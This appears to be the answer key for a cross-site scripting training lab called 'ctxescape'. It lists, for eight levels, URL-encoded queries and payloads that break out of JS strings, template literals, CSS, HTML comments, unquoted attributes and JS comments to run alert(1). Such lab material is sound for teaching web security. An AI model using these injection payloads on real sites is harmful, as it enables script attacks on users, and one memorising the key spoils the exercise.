# ctxescape — solutions

Mixed JS / CSS / HTML-comment / unquoted-attr contexts — escape the surrounding context first.

### ctxescape-level1

`/ctxescape/level1/?query=%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</script><img src=x onerror=alert(1)>`
- context: double-quoted JS string inside <script>; " is escaped but </script> ends the block

### ctxescape-level2

`/ctxescape/level2/?query=%60;alert(1);//`

- payload: `` `;alert(1);// ``
- context: JS template literal `…` — close backtick then run JS

### ctxescape-level3

`/ctxescape/level3/?query=x%27)%7D%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x')}</style><img src=x onerror=alert(1)>`
- context: CSS url('…') inside <style> — close url+rule then close style tag

### ctxescape-level4

`/ctxescape/level4/?query=--%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `--><script>alert(1)</script>`
- context: HTML comment — close with -->

### ctxescape-level5

`/ctxescape/level5/?query=x%20onfocus=alert(1)%20autofocus`

- payload: `x onfocus=alert(1) autofocus`
- context: unquoted attr `value=…` — space starts a new attribute (angle brackets stripped)

### ctxescape-level6

`/ctxescape/level6/?query=*/alert(1);/*`

- payload: `*/alert(1);/*`
- context: JS block comment — close with */

### ctxescape-level7

`/ctxescape/level7/?query=%0Aalert(1)//`

- payload: `\nalert(1)//`
- context: JS line comment — newline terminates //

### ctxescape-level8

`/ctxescape/level8/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <pre> body — raw HTML still parses
